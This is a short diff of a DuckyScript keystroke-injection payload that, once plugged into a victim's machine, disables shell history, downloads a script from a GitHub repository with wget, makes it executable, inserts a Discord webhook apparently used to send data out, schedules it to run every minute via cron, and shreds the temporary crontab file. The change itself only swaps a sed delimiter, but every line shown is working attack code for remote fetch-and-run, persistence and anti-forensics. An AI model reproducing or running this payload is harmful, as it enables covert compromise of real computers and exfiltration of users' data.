@@ -16,4 +16,4 @@ STRINGLN unset HISTFILE && wget https://raw.githubusercontent.com/OSINTI4L/Ducky
 DELAY 1200
 
 REM: Granting execution permissions to .sp.sh, adding Discord webhook, and embedding with cron:
-STRINGLN chmod +x .sp.sh && sed -i '14s/.*/    #Discord_Webhook/' .sp.sh && crontab -l > sptemp && echo "* * * * * ~/.sp.sh" >> sptemp && crontab sptemp && shred -fuz sptemp
+STRINGLN chmod +x .sp.sh && sed -i '14s|.*|    #Discord_Webhook|' .sp.sh && crontab -l > sptemp && echo "* * * * * ~/.sp.sh" >> sptemp && crontab sptemp && shred -fuz sptemp
